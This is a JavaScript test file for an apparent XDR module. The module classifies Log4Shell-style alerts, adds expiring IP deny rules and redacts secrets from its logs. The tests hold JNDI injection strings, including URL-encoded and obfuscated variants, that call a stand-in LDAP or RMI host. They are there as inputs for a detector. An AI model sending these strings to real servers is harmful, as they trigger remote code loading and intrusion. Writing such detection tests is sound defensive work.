import test from 'node:test';
import assert from 'node:assert/strict';
import { readFile, mkdtemp, rm } from 'node:fs/promises';
import { createHash } from 'node:crypto';
import { execFileSync } from 'node:child_process';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { decide } from '../xdr/known-cve/decide.mjs';
import { projectAlerts, readAlerts } from '../xdr/known-cve/read-alerts.mjs';
import { respond, findDenyRule, createXdrGate, createVaultXdrGate } from '../xdr/known-cve/respond.mjs';
import { decide as originalDecide } from '../src/decider.mjs';
import { replayKnownCve } from '../scripts/xdr-known-cve-replay.mjs';

const root = new URL('../', import.meta.url);
const bytes = await readFile(new URL('xdr/fixtures/known-cve.json', root));
const fixture = JSON.parse(bytes);
const clear = fixture.alerts[0], ambiguous = fixture.alerts[8], normal = fixture.alerts[16];
const at = Date.parse(clear.timestamp);
async function temporary(t) {
  const dir = await mkdtemp(join(tmpdir(), 'aleph-cve-'));
  t.after(() => rm(dir, { recursive: true, force: true }));
  return { rulePath: join(dir, 'rules.json'), logPath: join(dir, 'alerts.log') };
}

test('known CVE projection preserves official fixture and yields five redacted fields for every alert', async () => {
  assert.equal(createHash('sha1').update(`blob ${bytes.length}\0`).update(bytes).digest('hex'),
    'd0f444a98e457a579fbce613012485d49936b17c');
  const rows = await readAlerts();
  assert.equal(rows.length, 24);
  assert.ok(rows.every(row => Object.keys(row).sort().join(',') === 'account,description,level,sourceIp,timestamp'));
  const secret = ['sb', 'secret', 'x'.repeat(1200)].join('_');
  const jwt = ['eyJ' + 'a'.repeat(1000), 'eyJ' + 'b'.repeat(1000), 'c'.repeat(1000)].join('.');
  const projected = JSON.stringify(projectAlerts([{ ...clear,
    data: { ...clear.data, srcuser: 'private' + '@example.invalid', password: secret },
    rule: { level: 12, description: `password="${secret}" Bearer ${jwt}\nextra` } }]));
  for (const value of [secret.slice(0, 100), jwt.slice(0, 100), 'private' + '@example.invalid']) {
    assert.equal(projected.includes(value), false);
  }
});

test('known CVE patterns are grounded constants and classification is stateless with 8/8/8 decisions', async () => {
  const source = await readFile(new URL('xdr/known-cve/decide.mjs', root), 'utf8');
  const patterns = JSON.parse(await readFile(new URL('xdr/known-cve/patterns.json', root), 'utf8'));
  assert.deepEqual(JSON.parse(source.match(/const PATTERNS = (\[[\s\S]*?\]);/u)[1]), patterns);
  assert.ok(patterns.every(p => p.evidence && p.source.startsWith('https://')));
  assert.doesNotMatch(source, /\bimport\s*(?:\(|[{'"*])/u);
  assert.doesNotMatch(source, /\b(?:fetch|eval|Function|readFile|writeFile)\s*\(/u);
  const before = JSON.stringify(fixture);
  const answers = fixture.alerts.map(decide);
  assert.deepEqual([...fixture.alerts].reverse().map(decide).reverse(), answers);
  assert.equal(JSON.stringify(fixture), before);
  const counts = { block: 0, alert: 0, record: 0 };
  for (const out of answers) {
    counts[out.action]++;
    assert.deepEqual(Object.keys(out).sort(), ['action', 'confidence', 'reason']);
    assert.ok(out.confidence >= 0 && out.confidence <= 1);
    assert.equal(out.action, out.confidence >= 0.85 ? 'block' : out.confidence >= 0.5 ? 'alert' : 'record');
    assert.doesNotMatch(out.reason, /[\r\n]/u);
  }
  assert.deepEqual(counts, { block: 8, alert: 8, record: 8 });
});

test('new addresses, event IDs, headers and percent encodings match the syntax without performing a lookup', () => {
  const event = data => ({ id: 'unseen-event', rule: { level: 12, mitre: { id: ['T1190'] } },
    data: { srcip: '2001:db8::23', ...data } });
  for (const protocol of ['ldap', 'ldaps', 'rmi']) {
    const payload = '${jndi:' + protocol + '://192.0.2.99/training}';
    for (const value of [payload, encodeURIComponent(payload), encodeURIComponent(encodeURIComponent(payload))]) {
      for (const data of [{ url: '/new?q=' + value }, { useragent: value }, { headers: { 'X-Test': value } }]) {
        const out = decide(event(data));
        assert.equal(out.action, 'block');
        assert.match(out.reason, /^log4shell_remote_lookup:/u);
        assert.equal(out.reason.includes('192.0.2.99'), false);
      }
    }
  }
  for (const payload of ['${${lower:j}${lower:n}${lower:d}${lower:i}:ldap://192.0.2.99/training}',
    '${${::-j}${::-n}${::-d}${::-i}:ldap://192.0.2.99/training}']) {
    assert.equal(decide(event({ useragent: payload })).action, 'block');
  }
  const mutated = { ...clear, id: 'new-id', timestamp: '2026-10-01T00:00:00Z',
    data: { srcip: '198.51.100.98', useragent: '${jndi:ldap://192.0.2.99/training}' } };
  assert.deepEqual(decide(mutated), decide(clear));
});

test('names, scanner traces, incomplete lookups and malformed events are never automatic bans', () => {
  const event = data => ({ rule: { level: 12, mitre: ['T1190'] }, data: { srcip: '192.0.2.12', ...data } });
  for (const value of ['CVE-2021-44228', 'jndi-class-note', '/docs/log4j', 'log4j-scan',
    '${jndi:ldap://', '${jndi:dns://192.0.2.99/training}', '${jndi:java:comp/env/example}',
    'lookup-fragment', 'normal browser']) assert.notEqual(decide(event({ url: '/search?q=' + value })).action, 'block');
  for (const srcip of ['bad', '999.1.1.1', ':1:2:3:4:5:6:7:8', undefined]) {
    assert.equal(decide({ ...clear, data: { ...clear.data, srcip } }).action, 'alert');
  }
  for (const value of [null, [], '', {}, { data: [] }, { rule: { level: 16, mitre: ['T1190'] } }]) {
    assert.notEqual(decide(value).action, 'block');
  }
  const ignored = event({ headers: { Authorization: clear.data.useragent, Cookie: clear.data.useragent },
    password: clear.data.useragent, token: clear.data.useragent });
  assert.notEqual(decide(ignored).action, 'block');
  assert.equal(decide({ ...normal, id: 'normal-new-value', data: { ...normal.data, url: '/new/normal' } }).action, 'record');
  assert.doesNotThrow(() => decide(event({ url: '%ZZ' + 'a'.repeat(50000) })));
});

test('known CVE decide runs as a single module in an empty VM without imports or Node globals', () => {
  const script = `
    const fs = require('node:fs'); const vm = require('node:vm');
    (async () => {
      const context = vm.createContext({});
      const mod = new vm.SourceTextModule(fs.readFileSync(process.argv[1], 'utf8'), { context });
      await mod.link(() => { throw new Error('imports_forbidden'); });
      await mod.evaluate({ timeout: 1000 }); context.call = mod.namespace.decide;
      const counts = { block: 0, alert: 0, record: 0 };
      for (const alert of JSON.parse(fs.readFileSync(process.argv[2], 'utf8')).alerts) {
        context.input = alert;
        counts[vm.runInContext('call(input)', context, { timeout: 1000 }).action]++;
      }
      process.stdout.write(JSON.stringify(counts));
    })().catch(() => { process.exitCode = 1; });`;
  const out = execFileSync(process.execPath, ['--experimental-vm-modules', '-e', script,
    new URL('xdr/known-cve/decide.mjs', root).pathname, new URL('xdr/fixtures/known-cve.json', root).pathname],
  { encoding: 'utf8', timeout: 5000, stdio: ['ignore', 'pipe', 'pipe'] });
  assert.deepEqual(JSON.parse(out), { block: 8, alert: 8, record: 8 });
});

test('only fresh clear CVE attempts add expiring rules; logs exclude raw alerts and credentials', async t => {
  const paths = await temporary(t);
  for (const alert of [ambiguous, normal]) {
    assert.equal((await respond(alert, { ...paths, now: Date.parse(alert.timestamp) })).addedRule, null);
  }
  assert.equal((await respond(clear, { ...paths, now: at - 1 })).addedRule, null);
  assert.equal((await respond(clear, { ...paths, now: at + 6 * 60 * 1000 })).addedRule, null);
  const secret = ['sb', 'secret', 'x'.repeat(24)].join('_');
  const enriched = { ...clear, full_log: secret, data: { ...clear.data, password: secret } };
  const first = await respond(enriched, { ...paths, now: at });
  assert.ok(first.addedRule);
  assert.equal(Date.parse(first.addedRule.expiresAt), at + 15 * 60 * 1000);
  assert.deepEqual(first.addedRule.evidenceAlertIds, [clear.id]);
  await respond(clear, { ...paths, now: at + 1000 });
  assert.equal(Date.parse((await findDenyRule(clear.data.srcip, { ...paths, now: at + 1000 })).expiresAt), at + 15 * 60 * 1000);
  const next = { ...clear, id: 'new-evidence', timestamp: new Date(at + 2000).toISOString() };
  await Promise.all([respond(next, { ...paths, now: at + 2000 }), respond(clear, { ...paths, now: at + 2000 })]);
  const merged = await findDenyRule(clear.data.srcip, { ...paths, now: at + 3000 });
  assert.deepEqual(new Set(merged.evidenceAlertIds), new Set([clear.id, next.id]));
  assert.equal(await findDenyRule(clear.data.srcip, { ...paths, now: Date.parse(merged.expiresAt) }), null);
  const log = await readFile(paths.logPath, 'utf8');
  for (const value of [secret, clear.rule.description, clear.data.useragent]) assert.equal(log.includes(value), false);
});

test('CVE gate keeps the original request and verdict unless a trusted source matches an active rule', async t => {
  const paths = await temporary(t); await respond(clear, { ...paths, now: at });
  const request = Object.freeze({ schema: 'aleph.decision.v1', requestId: 'test-request', sourceIp: clear.data.srcip });
  const verdict = Object.freeze({ schema: 'aleph.decision.v1', requestId: request.requestId,
    decision: 'step_up', reasonCode: 'fixture_step_up', ruleIds: ['fixture.base'] });
  const base = seen => { assert.equal(seen, request); return verdict; };
  const options = { rulePath: paths.rulePath, clock: () => at,
    denyResponse: (seen, rule) => ({ schema: 'aleph.decision.v1', requestId: seen.requestId,
      decision: 'deny', reasonCode: 'fixture_deny', ruleIds: [rule.id] }) };
  const allowed = createXdrGate(base, { ...options, trustedSourceIpForRequest: () => normal.data.srcip });
  assert.equal(await allowed(request), verdict);
  const unknown = createXdrGate(base, { ...options, trustedSourceIpForRequest: () => null });
  assert.equal(await unknown(request), verdict);
  const blocked = createXdrGate(base, { ...options, trustedSourceIpForRequest: () => clear.data.srcip });
  assert.equal((await blocked(request)).decision, 'deny');
  const actual = createVaultXdrGate({ ...options, trustedSourceIpForRequest: () => normal.data.srcip });
  assert.deepEqual(await actual(request), await originalDecide(request));
  assert.throws(() => createXdrGate(base), /trusted_xdr_gate_callbacks_required/u);
});

test('chronological CVE replay blocks 8 candidates and permits 8 normal requests using the fixture base policy', async t => {
  const report = await replayKnownCve({ root, ...await temporary(t) });
  assert.deepEqual(report.counts, { block: 8, alert: 8, record: 8 });
  assert.equal(report.rulesAdded, 8);
  assert.equal(report.blockedCandidatesDenied, 8);
  assert.equal(report.normalEvents, 8);
  assert.equal(report.normalBlocked, 0);
  assert.equal(report.liveEngineConnected, false);
});
